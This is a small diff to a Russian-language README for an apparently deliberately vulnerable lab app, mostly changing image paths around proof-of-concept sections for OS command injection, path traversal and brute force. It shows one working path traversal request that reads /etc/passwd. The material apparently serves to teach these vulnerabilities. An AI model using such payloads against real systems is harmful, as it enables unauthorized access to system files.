@@ -58,6 +58,7 @@ docker run -p 5000:5000 app_with_vulns
    ```
    А потом отправим GET запрос на файл backup.jpg, увидим следующее:
    ![Alt text](images_for_readme/image4.png)
+
    Происходит успешное эксплуатирование уязвимости OS Command Injection.
 
 ### POC для Path Traversal
@@ -69,7 +70,8 @@ docker run -p 5000:5000 app_with_vulns
    ```
    GET /view_cover?cover_path=../../../../../../../../../../../../etc/passwd HTTP/1.1
    ```
-   ![Alt text](image.png)
+   ![Alt text](images_for_readme/image5.png)
+   
    Успешно получаем содержимое файла /etc/passwd.
 
 ### POC для Brute force
